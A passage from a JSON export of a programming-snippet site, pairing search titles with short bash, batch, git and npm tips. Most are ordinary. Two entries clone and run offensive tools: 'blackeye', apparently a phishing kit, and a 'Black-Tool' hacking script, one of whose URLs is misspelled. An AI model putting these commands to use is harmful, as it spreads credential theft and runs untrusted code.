    "description": "# Basic syntax: command &> output_and_error_file  # Note, in Bash and other Linux shells, when a program is executed, it #\tuses one of three standard I/O streams. Each stream is represented  #\tby a numeric file descriptor: #\t\t- 0, or stdin, the standard input stream #\t\t- 1, or stdout, the standard output stream #\t\t- 2, or stderr, the standard error stream #\tBy default the \">\" operator uses 1 and is equivalent to \"1>\"  # Example uses: # Redirect the standard error to a specific file: command 2> error_file  # Redirect the standard output and standard error to different files: command 1> output_file 2> error_file\n# Basic syntax: command >> output_file # Append stdout to output_file  # Note, use > to overwrite file contents and >> to append to a file # Note, if the output_file doesn't exist, it will be created\n",
    "reg_date": "2021-10-11T22:01:45.000Z"
  },
  {
    "id": 642,
    "keyword": null,
    "link": null,
    "title": " bash remove characters from end of every line",
    "description": "# Basic syntax using sed: sed 's/..$//' input_file # Where: #\t- 's///' means 's/search_for/replace_with/' #\t- '.' means any character #\t- $ means end of the line # Putting it together, this sed statement means: replace any two  #\tcharacters at the end of every line with nothing.   # Note, adapt this for your needs by changing the search pattern.  #\tE.g., by adding more '.'s, changing the search pattern, etc \n",
    "reg_date": "2021-10-11T22:01:45.000Z"
  },
  {
    "id": 643,
    "keyword": null,
    "link": null,
    "title": " bash remove duplicate lines from a file",
    "description": "# Basic syntax: sort input_file | uniq --unique # Sort the file first because uniq requires a sorted file to work. Uniq # then eliminates all duplicated lines in the file, keeping one instance # of each duplicated line  # Note, this doesn't return only non-duplicated lines. It returns # unique instances of all lines, whether or not they are duplicated  # Note, if you want to return only one instance of all lines but see # the number of repetitions for each line, run: sort input_file | uniq -c\n",
    "reg_date": "2021-10-11T22:01:45.000Z"
  },
  {
    "id": 644,
    "keyword": null,
    "link": null,
    "title": " bash remove everything after character x",
    "description": "echo \"Hello: world\" | cut -f1 -d\":\"\n",
    "reg_date": "2021-10-11T22:01:46.000Z"
  },
  {
    "id": 645,
    "keyword": null,
    "link": null,
    "title": " bash remove newline from string",
    "description": "echo \"${string}\"|tr '\\n' ' '\n",
    "reg_date": "2021-10-11T22:01:46.000Z"
  },
  {
    "id": 646,
    "keyword": null,
    "link": null,
    "title": " bash replace multiple patterns",
    "description": "# Basic syntax: sed 's/<pattern_1>/<replacement_1>/; s/<pattern_2>/<replacement_2>/' your_file\n",
    "reg_date": "2021-10-11T22:01:46.000Z"
  },
  {
    "id": 647,
    "keyword": null,
    "link": null,
    "title": " bash replace specific line in file",
    "description": "# Basic syntax: sed '<row_number>s/.*/<replacement_text>/' your_file # Where: #\t- The row_number is the row your want to replace with the #\t\treplacement_text #\t- .* means match anything on that row (so it can be replaced)\n",
    "reg_date": "2021-10-11T22:01:47.000Z"
  },
  {
    "id": 648,
    "keyword": null,
    "link": null,
    "title": " bash replace substring",
    "description": "echo [string] | sed \"s/[original]/[target]/g\"\n",
    "reg_date": "2021-10-11T22:01:47.000Z"
  },
  {
    "id": 649,
    "keyword": null,
    "link": null,
    "title": " bash return last n characters from every line",
    "description": "# Basic syntax: cat file.txt | rev | cut -c 1-3 | rev > output.txt # Here we reverse each line, grab characters 1-3 (the last two  #\tcharacters of the original string), and then reverse the string again\n",
    "reg_date": "2021-10-11T22:01:47.000Z"
  },
  {
    "id": 650,
    "keyword": null,
    "link": null,
    "title": " bash return lines from one file that arent in another",
    "description": "# Example usage: awk 'NR==FNR { b[$0] = 1; next } !b[$0]' input_file_1 input_file_2 # This returns all lines of input_file_2 that aren't found in  # input_file_1  # Note, remove the ! to return all lines in common between the files\n",
    "reg_date": "2021-10-11T22:01:48.000Z"
  },
  {
    "id": 651,
    "keyword": null,
    "link": null,
    "title": " bash return only first line that contains match for each line in a file",
    "description": "# Basic syntax while IFS= read -r LINE; do     grep -m number_matches \"$LINE\" target_file >> output_file done < reference_file  # Where: #\t- the reference_file is the file of lines you want to search for #\t- the target_file is the file you want to search #\t- number_matches is the number of matching lines to return from the #\t\ttarget file (set to 1 for returning first match) #\t- IFS= preserves leading and trailing white space in LINE #\t- -r prevents read from treating \\ as a special character #\t- >> appends matching lines to output_file rather than overwriting it\n# Basic syntax: grep -m 1 \"pattern\" input_file.txt # Where -m is the maximum number of matching lines to return, i.e. stop #\treading the file after m matches # Note, this is more efficient than piping to head because there you #\talways read the whole file even if you're only looking for m matches\n",
    "reg_date": "2021-10-11T22:01:48.000Z"
  },
  {
    "id": 652,
    "keyword": null,
    "link": null,
    "title": " bash return unique lines based on column",
    "description": "# Basic syntax: awk -F'delimiter' '!a[$column_number]++' input_file # Where: #\t- The column_number is the column you want to use for checking #\t\tif a line is unique #\t- The delimiter is the delimiter used in the input_file. Note that #\t\tawk recognizes spaces, tabs, and new lines as delimiters by  #\t\tdefault, so this can be omitted if your file uses one of those.  # Example usage 1: # Say you have a comma-delimited file with the following rows and only #\twant one copy of the row based on the third field 10,15-10-2014,abc 20,12-10-2014,bcd 10,09-10-2014,def 40,06-10-2014,ghi 10,15-10-2014,abc # Looking only at field 3, this row duplicates row 1  # Running: awk -F',' '!a[$3]++' input_file  # Would return: 10,15-10-2014,abc 20,12-10-2014,bcd 10,09-10-2014,def 40,06-10-2014,ghi # The second instance of abc in the third field/column is ignored.   # Note, this only returns the first line that has a duplicate entry in #\tyour specified column.  # Example usage 2: # Say you have a tab-delimited file with the following rows and only #\twant one copy of each row based on the first AND fourth fields a\t11\tb\t17 c\t23\td\t27 a\t31\te\t17 # Looking only at fields 1 and 4 this row duplicates row 1 a\t17\tf\t42  # Running: awk '!a[$1$4]++' input_file # Would return: a\t11\tb\t17 c\t23\td\t27 a\t17\tf\t42\n",
    "reg_date": "2021-10-11T22:01:48.000Z"
  },
  {
    "id": 653,
    "keyword": null,
    "link": null,
    "title": " bash return unique lines starting at nth field",
    "description": "# Basic syntax: uniq -f number input_file # Where number specifies the number of fields/columns to ignore from left  #\tto right when doing comparisons to return unique lines  # Note, uniq requires a sorted input. You can sort a file based on  #\tspecific fields with sort -k start_field_#,end_field_#  # Example usage: sort -k 5,7 input_file | uniq -f 5 # This would sort the file using  #\tfields 5-7 and then return unique lines based on a comparison  #\tstarting at the 5th field\n",
    "reg_date": "2021-10-11T22:01:48.000Z"
  },
  {
    "id": 654,
    "keyword": null,
    "link": null,
    "title": " bash run all commands in a file",
    "description": "# Basic syntax: bash your_file # This is an instance in which something is surprisingly easier that you # might expect on the command line. Just list the shell commands you  # want to run in a file and run bash that_file and every command is run  # sequentially line by line\n",
    "reg_date": "2021-10-11T22:01:49.000Z"
  },
  {
    "id": 655,
    "keyword": null,
    "link": null,
    "title": " bash script how to show a file by using less",
    "description": "less your-file-name \n",
    "reg_date": "2021-10-11T22:01:49.000Z"
  },
  {
    "id": 656,
    "keyword": null,
    "link": null,
    "title": " bash script to output a specific line of a file",
    "description": "/** * A bash script to print at stdout line_number from file_name * @line_number: the line number you want to print * @file_name: the file you want to read from */  awk '{if(NR==line_number) print $0}' file_name\n",
    "reg_date": "2021-10-11T22:01:49.000Z"
  },
  {
    "id": 657,
    "keyword": null,
    "link": null,
    "title": " bash search file in directory",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n# syntax  # find *</path/to/dir> '(' *<filter-1> -o *<filter-2> ')'  # example  find . '(' -name '*ERR5312209.zip' -o -name '*ERR5312209.TXT' ')'\n",
    "reg_date": "2021-10-11T22:01:49.000Z"
  },
  {
    "id": 658,
    "keyword": null,
    "link": null,
    "title": " bash send to dev null",
    "description": "command > /dev/null 2>&1\ncommand > /dev/null #Example echo \"Hello World\" Hello World echo \"Hello World\" > /dev/null #Doesn't show anything\n",
    "reg_date": "2021-10-11T22:01:50.000Z"
  },
  {
    "id": 659,
    "keyword": null,
    "link": null,
    "title": " bash service list",
    "description": "# list all running services systemctl list-units --type=service  # look for one in particular systemctl list-units --type=service | grep serviceName\n",
    "reg_date": "2021-10-11T22:01:50.000Z"
  },
  {
    "id": 660,
    "keyword": null,
    "link": null,
    "title": " bash set two variables at once",
    "description": "# Basic syntax: read -r variable1 variable2 <<< $(bash command generating two outputs) # Where: #\t- -r specifies that backslashes should not be handled differently  # Example usage: read -r var1 var2 <<< $(echo \"one two\") echo $var1 --> one echo $var2 --> two\n",
    "reg_date": "2021-10-11T22:01:50.000Z"
  },
  {
    "id": 661,
    "keyword": null,
    "link": null,
    "title": " bash silence output",
    "description": "echo no stdout 1>/dev/null # no stdout echo no stderr 2>/dev/null # no stderr echo no output &>/dev/null # no stdout and stderr\n",
    "reg_date": "2021-10-11T22:01:50.000Z"
  },
  {
    "id": 662,
    "keyword": null,
    "link": null,
    "title": " bash sleep milliseconds",
    "description": "sleep NUMBER[SUFFIX]\t#Just use this command structure to wait/sleep #Example: sleep 5m\t#sleeps 5 minutes sleep 0.1\t\t#sleeps 0.1 seconds or 100 miliseconds #Suffixes s - seconds (default) m - minutes h - hours d - days When no suffix is specified, it defaults to seconds.\n",
    "reg_date": "2021-10-11T22:01:50.000Z"
  },
  {
    "id": 663,
    "keyword": null,
    "link": null,
    "title": " bash slurm show running jobs",
    "description": "# Basic syntax: squeue -u username\n",
    "reg_date": "2021-10-11T22:01:50.000Z"
  },
  {
    "id": 664,
    "keyword": null,
    "link": null,
    "title": " bash slurm view jobs from date",
    "description": "# Basic syntax: sacct -S yyyy-mm-dd -u username --format=User,JobID,Jobname`,state,time,start,end,elapsed,CPUTime,MaxRss,MaxVMSize,MaxDiskRead,MaxDiskWrite,nnodes,ncpus,nodelist # Where: #\t- --format specifies the fields to return #\t- ` specifies the number of characters to make available for  #\t\tthe given field\n",
    "reg_date": "2021-10-11T22:01:51.000Z"
  },
  {
    "id": 665,
    "keyword": null,
    "link": null,
    "title": " bash sort bed file by chrom start end",
    "description": "# Basic syntax: sort -V -k1,1 -k2,2 input_file.bed > sorted_file.bed # This sorts alphanumerically by chromosome and then byvstart position  #\tand then by end position, producing a file order like: chr1\t1\t10 chr1\t2\t5 chr2\t1\t10 .\t\t.\t. .\t\t.\t. .\t\t.\t. chr10\t1\t10 .\t\t.\t. .\t\t.\t. .\t\t.\t. chrX\t1\t10 chrY\t1\t10\n",
    "reg_date": "2021-10-11T22:01:51.000Z"
  },
  {
    "id": 666,
    "keyword": null,
    "link": null,
    "title": " bash split and get last",
    "description": "Use rev command altogether with cut command as follows: echo \"a1 a2 a3 a4 a5\" | rev | cut -d ' ' -f '1' | rev #rev reverses string, then you cut from 2th field to end and reverse back\n",
    "reg_date": "2021-10-11T22:01:51.000Z"
  },
  {
    "id": 667,
    "keyword": null,
    "link": null,
    "title": " bash split file into multiple files",
    "description": "# Basic syntax: split --lines=1000 --numeric-suffixes --suffix-length=2 input_file output_file_prefix # Where: #\t- --lines=# is the number of lines to include per split file #\t- --numeric-suffixes tells split to use numbers on the output filenames #\t- --suffix-length=# tells split to use a numeric length of #,  #\t\tE.g. 2 = 00, 01, 02... #\t- output_file_prefix is the first part of the filename for every  #\t\toutput file\n",
    "reg_date": "2021-10-11T22:01:51.000Z"
  },
  {
    "id": 668,
    "keyword": null,
    "link": null,
    "title": " bash split string with awk",
    "description": "# Basic syntax: awk '{split($column_to_split,array_name,\"delimiter\"); print a[index]}' # Where: #\t- the array_name is usually shortened to a #\t- delimiter is the delimiter you want to split the string by #\t- index is the index of the string \"piece\" you want to work with  # Example usage: # Say you want to split the following string by underscores and print # the third item: string_containing_CODE_to_pentagon echo \"string_containing_CODE_to_pentagon\" | awk '{split($0,a,\"_\"); print a[3]}' --> CODE  # Example usage: # Say you have input_file.txt that contains two columns and you want to  # split the second column by | and then by _ and then print the second  # string of the final split: cat file.txt --> code_1\t12|ab_cd|34_ef \tcode_2\tef_56|gh_78_ij  awk '{split($2, a, \"|\");  split(a[2],b,\"_\"); print b[2]}' file.txt --> cd \t78\nJust use function split in awk command to split a line into an array 'a' using a choosen string as delimiter as for example \", \" in next use case: echo \"hi, bye, hey\" | awk '{split($0,a,\", \"); print a[3],a[2],a[1]}'\n",
    "reg_date": "2021-10-11T22:01:51.000Z"
  },
  {
    "id": 669,
    "keyword": null,
    "link": null,
    "title": " bash string contains",
    "description": "string='Haystack';  if [[ $string =~ \"Needle\" ]] then    echo \"It's there!\" fi\n#!/bin/bash  STR='GNU/Linux is an operating system' SUB='Linux' if [[ \"$STR\" == *\"$SUB\"* ]]; then   echo \"It's there.\" fi \n#!/bin/bash  STR='GNU/Linux is an operating system' SUB='Linux'  if [[ \"$STR\" =~ .*\"$SUB\".* ]]; then   echo \"It's there.\" fi \n",
    "reg_date": "2021-10-11T22:01:51.000Z"
  },
  {
    "id": 670,
    "keyword": null,
    "link": null,
    "title": " bash string to file",
    "description": "# syntax (note: the -e switch is to allow for backslash escapes) echo -e \"<string-to-append>\" >> <file-to-append-to>  # example  echo -e \"Hello there, new line!\" >> RandomWorld.txt  # ----------------------------------------------- # In order to see the effect of -e, append the following string: \"Hello there,\\n new line!\" \n",
    "reg_date": "2021-10-11T22:01:51.000Z"
  },
  {
    "id": 671,
    "keyword": null,
    "link": null,
    "title": " bash strip preceeding white space",
    "description": "# Basic syntax: sed 's/^ *//g'  # Example usage: echo '                    text' # Printing without sed command -->                     text echo '                    text' | sed 's/^ *//g' # Pipe to sed command --> text\n",
    "reg_date": "2021-10-11T22:01:52.000Z"
  },
  {
    "id": 672,
    "keyword": null,
    "link": null,
    "title": " bash suppress error code",
    "description": "particular_script || true\n",
    "reg_date": "2021-10-11T22:01:52.000Z"
  },
  {
    "id": 673,
    "keyword": null,
    "link": null,
    "title": " bash swap two columns in a file",
    "description": "# Example usage: awk '{t=$1; $1=$2; $2=t; print;}' input_file # Swap column 1 and column 2 # This assigns column 1 to a dummy variable t, makes column 1 equal # to column 2, and then assigns the contents of t to column 2\n",
    "reg_date": "2021-10-11T22:01:52.000Z"
  },
  {
    "id": 674,
    "keyword": null,
    "link": null,
    "title": " bash symlink everything in a directory",
    "description": "# Basic syntax: ln -s /path/to/directory/* /path/to/symlinks/ # Where: #\t- The /path/to/directory/ is where the real files are stored #\t- The /path/to/symlinks/ is where the symlinks will be created #\t- -s means symlink # Note, I also like to add the -f and -i flags which remove existing #\tdestination files and prompt before replacement\n",
    "reg_date": "2021-10-11T22:01:52.000Z"
  },
  {
    "id": 675,
    "keyword": null,
    "link": null,
    "title": " bash tee stdout and stderr",
    "description": "command > >(tee stdout.log) 2> >(tee stderr.log >&2)\n",
    "reg_date": "2021-10-11T22:01:52.000Z"
  },
  {
    "id": 676,
    "keyword": null,
    "link": null,
    "title": " bash test boolean",
    "description": "the_world_is_flat=true # ...do something interesting... if [ \"$the_world_is_flat\" = true ] ; then     echo 'Be careful not to fall off!' fi\ntrueOrFalse=true if ${trueOrFalse} ; then \techo \"to consider ${trueOrFalse} is a boolean value\" else \techo \"Correct me if any.\" fi\n",
    "reg_date": "2021-10-11T22:01:52.000Z"
  },
  {
    "id": 677,
    "keyword": null,
    "link": null,
    "title": " bash unsquash specific files",
    "description": "# Basic syntax: unsquashfs -l file.sqfs # Where .sqfs is a squash file, which is a type of data compression\n# Basic syntax: unsquashfs -f -d /path/to/output/directory file.sqfs /path/to/file_or_directory/from/sqfs_root  # Note, the output directory should not exist when this is run. # Note, you can view the file paths in the .sqfs file with unsquashfs -l file.sqfs \n",
    "reg_date": "2021-10-11T22:01:53.000Z"
  },
  {
    "id": 678,
    "keyword": null,
    "link": null,
    "title": " bash unzip all files",
    "description": "$ unzip \\*.zip\n",
    "reg_date": "2021-10-11T22:01:53.000Z"
  },
  {
    "id": 679,
    "keyword": null,
    "link": null,
    "title": " bash use argument from previous command",
    "description": "!^      first argument !$      last argument !*      all arguments !:2     second argument  !:2-3   second to third arguments !:2-$   second to last arguments !:2*    second to last arguments !:2-    second to next to last arguments  !:0     the command !!      repeat the previous line\n",
    "reg_date": "2021-10-11T22:01:53.000Z"
  },
  {
    "id": 680,
    "keyword": null,
    "link": null,
    "title": " bash use cat in sed command",
    "description": "# Basic syntax: sed 's/<search_text>/'\"`cat replacement.txt`\"'/' your_file # Where: #\t- The replacement.txt file contains a single line that will be used #\t\tto replace the search_text, where found in your_file.  # Note, this isn't very useful unless combined with other functions like #\t\tfind exec, e.g.: find *.txt -exec sed -i 's/search_text/'\"`cat replacement.txt`\"'/' {} \\;\n",
    "reg_date": "2021-10-11T22:01:53.000Z"
  },
  {
    "id": 681,
    "keyword": null,
    "link": null,
    "title": " bash view the contents of a sqfs file",
    "description": "# Basic syntax: unsquashfs -l file.sqfs # Where .sqfs is a squash file, which is a type of data compression\n",
    "reg_date": "2021-10-11T22:01:53.000Z"
  },
  {
    "id": 682,
    "keyword": null,
    "link": null,
    "title": " bash vlookup function",
    "description": "# Example usage: awk 'FNR==NR{a[$1]=$2; next}; {if($9 in a) {print $0, \"\\t\"a[$9];} else {print $0, \"\\tNA\"}}' input_file_1 input_file_2 # This command does a VLOOKUP-type operation between two files using #\tawk. With the numbers above, column 1 from input_file_1 is used  #\tan a key in an array with column 2 of input_file_1 as the match for  #\tthe key. Column 9 of input_file_2 is then compared to the keys from #\tinput_file_1 and any matches return the associated match from  #\tinput_file_1 (here, column 2).\n",
    "reg_date": "2021-10-11T22:01:53.000Z"
  },
  {
    "id": 683,
    "keyword": null,
    "link": null,
    "title": " bash windows open folder in exporer",
    "description": "explorer . # open current folder\n",
    "reg_date": "2021-10-11T22:01:53.000Z"
  },
  {
    "id": 684,
    "keyword": null,
    "link": null,
    "title": " bash zero padding",
    "description": "for i in $(seq -f \"\u0005g\" 10 15) do   echo $i done \n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 685,
    "keyword": null,
    "link": null,
    "title": " bashrc autocomplete case insensitive",
    "description": "bind 'set completion-ignore-case on'\n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 686,
    "keyword": null,
    "link": null,
    "title": " bashrc file location in linux",
    "description": "vi ~/.bashrc\n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 687,
    "keyword": null,
    "link": null,
    "title": " bashrc termina,",
    "description": "vi ~/.bashrc \n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 688,
    "keyword": null,
    "link": null,
    "title": " bastighg",
    "description": "ngbcvngcfxhdftdx\n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 689,
    "keyword": null,
    "link": null,
    "title": " batch copy silent",
    "description": "# Execute windows batch command silently  COPY file1 file2 >NUL\n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 690,
    "keyword": null,
    "link": null,
    "title": " batch delete folder",
    "description": "# NOTE: for cmd/batch/DOS only (not bash/Linux)  # EXAMPLE: rmdir /s /q \"C:\\Users\\TomDickHarry\\DeletableStuff\"  # SYNTAX # rmdir /s /q \"<your-folder-to-delete>\"\nrmdir example\ndel /f /q \"%appdata%\\uTorrent\\CompletedDL\\*.*\" for /d %%d in (\"%appdata%\\uTorrent\\CompletedDL\\*.*\") do rmdir /s /q \"%%d\" \n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 691,
    "keyword": null,
    "link": null,
    "title": " batch directory",
    "description": "echo [current working directory]     :     %%cd%%       :      %cd%      echo [batch folder path]             :     %%~dp0      :      %~dp0      echo [batch files fullpath]          :     %%~dpnx0    :      %~dpnx0 echo [batch files fullpath]          :     %%~f0       :      %~f0  REM # | OUTPUT EXAMPLE REM # | [current working directory] : %cd%     :  G:\\DynamicWorkingDirectory REM # | [batch folder path]         : %~dp0    :  G:\\Deletable\\ REM # | [batch files fullpath]      : %~dpnx0  :  G:\\Deletable\\01_Basic.bat REM # | [batch files fullpath]      : %~f0     :  G:\\Deletable\\01_Basic.bat\n",
    "reg_date": "2021-10-11T22:01:54.000Z"
  },
  {
    "id": 692,
    "keyword": null,
    "link": null,
    "title": " batch file cool ending",
    "description": ":end set num=%random% if exist temp%num%.vbs goto num echo ' > \"temp%num%.vbs\" echo set speech = Wscript.CreateObject(\"SAPI.spVoice\") >> \"temp%num%.vbs\" echo speech.speak \"Goodbye\" >> \"temp%num%.vbs\" start temp%num%.vbs timeout 2 del temp%num%.vbs\n",
    "reg_date": "2021-10-11T22:01:55.000Z"
  },
  {
    "id": 693,
    "keyword": null,
    "link": null,
    "title": " batch file to write xml into file",
    "description": ":: Use ^ before the character in order to make cmd ignore it as a function  @Echo off call :data2 >file1.txt exit /b  :data2 ECHO OFF ECHO ^<^?xml version=\"1.0\" encoding=\"UTF-8\"^?^>\n",
    "reg_date": "2021-10-11T22:01:55.000Z"
  },
  {
    "id": 694,
    "keyword": null,
    "link": null,
    "title": " batch loops",
    "description": "set LoopVar=0 :Loop echo %LoopVar% set /a LoopVar=%LoopVar%+1 if not %LoopVar%==100 goto Loop echo Done! pause  ------------------------------------             HOW IT WORKS ------------------------------------ set LoopVar=0 <--- Sets the counter to 0 :Loop echo %LoopVar% <--- Echos Status set /a LoopVar=%LoopVar%+1 <--- Adds +1 to the Var \"LoopVar\" if not %LoopVar%==100 goto Loop <-- Until \"LoopVar\" equals 100 it repeats the job. (You can change the 100 to any number you would like.) echo Done! pause \n// batch for loop for /l %%x in (1, 1, 100) do (    echo %%x    copy %%x.txt z:\\whatever\\etc ) \nfor /l %x in (1, 1, 100) do (    echo %x    copy %x.txt z:\\whatever\\etc ) \n",
    "reg_date": "2021-10-11T22:01:55.000Z"
  },
  {
    "id": 695,
    "keyword": null,
    "link": null,
    "title": " batch remove file",
    "description": "del \"path\"\ndel Example \n",
    "reg_date": "2021-10-11T22:01:55.000Z"
  },
  {
    "id": 696,
    "keyword": null,
    "link": null,
    "title": " batch substring",
    "description": "REM # | EXAMPLE set \"StringA=Some random string this is\" echo %StringA:~5,6%  REM # | SYNTAX REM # | %<variable-name>:~<substring-start-index>,<substring-length>%\n",
    "reg_date": "2021-10-11T22:01:55.000Z"
  },
  {
    "id": 697,
    "keyword": null,
    "link": null,
    "title": " battery report windows 10",
    "description": "powercfg /batteryreport\n",
    "reg_date": "2021-10-11T22:01:56.000Z"
  },
  {
    "id": 698,
    "keyword": null,
    "link": null,
    "title": " beautifulsoup4 install",
    "description": "pip install beautifulsoup4\npip install bs4 #this'll do the work\n#to install beautiful soup use this command pip install beautifulsoup4\nto install beautiful soup use this command pip install beautifulsoup4\n",
    "reg_date": "2021-10-11T22:01:56.000Z"
  },
  {
    "id": 699,
    "keyword": null,
    "link": null,
    "title": " best audio visualiser for linux",
    "description": "Glava How to Install: sudo add-apt-repository ppa:linuxuprising/apps sudo apt update sudo apt install glava\n",
    "reg_date": "2021-10-11T22:01:56.000Z"
  },
  {
    "id": 700,
    "keyword": null,
    "link": null,
    "title": " best screen capture software for linux u",
    "description": "sudo apt install kazam\n",
    "reg_date": "2021-10-11T22:01:56.000Z"
  },
  {
    "id": 701,
    "keyword": null,
    "link": null,
    "title": " best shell linux",
    "description": "Bash  Zsh Ksh Tcsh Fish\n",
    "reg_date": "2021-10-11T22:01:56.000Z"
  },
  {
    "id": 702,
    "keyword": null,
    "link": null,
    "title": " better discord in linux",
    "description": "$ curl -O https://raw.githubusercontent.com/bb010g/betterdiscordctl/master/betterdiscordctl $ chmod +x betterdiscordctl $ sudo mv betterdiscordctl /usr/local/bin \n",
    "reg_date": "2021-10-11T22:01:56.000Z"
  },
  {
    "id": 703,
    "keyword": null,
    "link": null,
    "title": " bily-101 github",
    "description": "join my git hub at https://github.com/bily-101\n",
    "reg_date": "2021-10-11T22:01:57.000Z"
  },
  {
    "id": 704,
    "keyword": null,
    "link": null,
    "title": " bison install ubuntu",
    "description": "sudo apt-get install -y bison\n",
    "reg_date": "2021-10-11T22:01:57.000Z"
  },
  {
    "id": 705,
    "keyword": null,
    "link": null,
    "title": " bitcoin miner for mac cli",
    "description": "Download this: http://macminer.fabulouspanda.com/macminer/  cd /Applications/MacMiner.app/Contents/Resources/bfgminer/bin  ./bfgminer -o http://your.pool.com:9332 -u username -p password \n",
    "reg_date": "2021-10-11T22:01:57.000Z"
  },
  {
    "id": 706,
    "keyword": null,
    "link": null,
    "title": " bitnami lamp restart apache",
    "description": "sudo /opt/bitnami/ctlscript.sh restart apache \nsudo /opt/bitnami/ctlscript.sh status \n",
    "reg_date": "2021-10-11T22:01:57.000Z"
  },
  {
    "id": 707,
    "keyword": null,
    "link": null,
    "title": " bitnami restart apache",
    "description": "sudo /opt/bitnami/ctlscript.sh restart apache \nsudo /opt/bitnami/ctlscript.sh status \n",
    "reg_date": "2021-10-11T22:01:57.000Z"
  },
  {
    "id": 708,
    "keyword": null,
    "link": null,
    "title": " bitnami wordpress folder",
    "description": "/opt/bitnami/apps/wordpress/htdocs/wp-config.php\n",
    "reg_date": "2021-10-11T22:01:58.000Z"
  },
  {
    "id": 709,
    "keyword": null,
    "link": null,
    "title": " black Tool github",
    "description": "# For Linux git clone https://gitbub.com/mrprogrammer2938/Black-Tool  cd Black-Tool  python3 install.py  python3 hack --help  # For Windows git clone https://github.com/mrprogrammer2938/Black-Tool-Windows  cd Black-Tool-Windows  cd Core/Ruby/  ruby hack.rb  # For Termux git clone https://github.com/mrprogrammer2938/Black-Tool-Termux  cd Black-Tool-Termux  bash install.sh  python3 hack # Github: https://github.com/mrprogrammer2938\n",
    "reg_date": "2021-10-11T22:01:58.000Z"
  },
  {
    "id": 710,
    "keyword": null,
    "link": null,
    "title": " blackeye github",
    "description": "git clone https://github.com/thelinuxchoice/blackeye cd blackeye bash blackeye.sh\n",
    "reg_date": "2021-10-11T22:01:58.000Z"
  },
  {
    "id": 711,
    "keyword": null,
    "link": null,
    "title": " bluez ubuntu 20.04",
    "description": "$ sudo apt install bluez \n",
    "reg_date": "2021-10-11T22:01:58.000Z"
  },
  {
    "id": 712,
    "keyword": null,
    "link": null,
    "title": " blutooth won't turn on kali linux",
    "description": "# If your Bluetooth device was blocked/disabled,  # it's a chance that the Bluetooth service is not started  # on your machine, so start it using:  sudo service bluetooth start \n",
    "reg_date": "2021-10-11T22:01:58.000Z"
  },
  {
    "id": 713,
    "keyword": null,
    "link": null,
    "title": " bobrossquotes terminal",
    "description": "sudo snap install bobrossquotes | bobrossquotes  //Start playin the bobross theme song\n",
    "reg_date": "2021-10-11T22:01:58.000Z"
  },
  {
    "id": 714,
    "keyword": null,
    "link": null,
    "title": " bookbuild react app from scratch",
    "description": "npm install --save-dev babel-loader\n",
    "reg_date": "2021-10-11T22:01:58.000Z"
  },
  {
    "id": 715,
    "keyword": null,
    "link": null,
    "title": " boost volume ubuntu",
    "description": "In your terminal, execute the following:  \tpactl -- set-sink-volume 0 150%\npactl -- set-sink-volume 1 150% \n",
    "reg_date": "2021-10-11T22:01:59.000Z"
  },
  {
    "id": 716,
    "keyword": null,
    "link": null,
    "title": " bootstrap npm",
    "description": "npm install bootstrap //OR npm install bootstrap@latest\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install bootstrap@latest\nnpm i bootstrap@5.0.0-alpha1\n",
    "reg_date": "2021-10-11T22:01:59.000Z"
  },
  {
    "id": 717,
    "keyword": null,
    "link": null,
    "title": " bootstrap react install",
    "description": "//1.run following commnad in cmd: npm install bootstrap --save //you can now use bootstrap component. example: import { Button } from 'react-bootstrap';  //2.or  add this to index.js: <link   rel=\"stylesheet\"   href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\"   integrity=\"sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l\"   crossorigin=\"anonymous\" />\n1.run command in cmd npm install react-bootstrap bootstrap  2.after install add this to index.js import 'bootstrap/dist/css/bootstrap.min.css';  //You may want to add individual components like 'Navbar',  // or 'Button' rather than the entire library. 3. add this, or similar to the js files that would be using the individual components import {Navbar, Nav, Button} from 'react-bootstrap';\n# with npm npm install react-bootstrap bootstrap  #with yarn yarn add react-bootstrap bootstrap\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install react-bootstrap bootstrap\nnpm install bootstrap --save // Inside of your command line  import 'bootstrap/dist/css/bootstrap.min.css'; // Inside of your index.js\n",
    "reg_date": "2021-10-11T22:01:59.000Z"
  },
  {
    "id": 718,
    "keyword": null,
    "link": null,
    "title": " borrar images docker",
    "description": "docker system prune -a \n",
    "reg_date": "2021-10-11T22:01:59.000Z"
  },
  {
    "id": 719,
    "keyword": null,
    "link": null,
    "title": " branch list in git",
    "description": "git branch -a\ngit branch -a \t#all local and remote branches are listed git branch -r \t#remote branches are listed git branch \t\t#only local branches are listed\n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 720,
    "keyword": null,
    "link": null,
    "title": " branching strategy in your company",
    "description": "Our test framework is separate repo from the application code repo. Automation framework  has a smaller code base, and fewer people are involved. so we do not have a very complicated branching strategy \tWe have master and develop branches(buffer branch)     in our automation framework repository.     Once I have a story from jira, I create a     new branch from the develop branch with the     issue number of my jira story and check out. \tgit branch <branchName> \tgit checkout -b vyt-59I  \twrite my automated tests on this branch.     Once completed, I create a pull request      so that my code can be reviewed. Once my      team reviews the code, my branch is merged into develop.   \tAfter code is merged, I delete the branch.  \tgit branch -d <branch_name> \tThen get another story from jira,      create new branch for that one ...  \tAt the end of every sprint, (or quarter)     we merge with master.  \tMy daily automated smoke      from Jenkins runs against the master branch.  \tMaster branch is stable since      we only merge into with once a sprint.\n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 721,
    "keyword": null,
    "link": null,
    "title": " brave disable gpu linux",
    "description": "go to brave://flags  -> disable Override software rendering list -> disable Accelerated 2D canvas -> disable GPU rasterization  hope this helps ;)\n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 722,
    "keyword": null,
    "link": null,
    "title": " brave on linux",
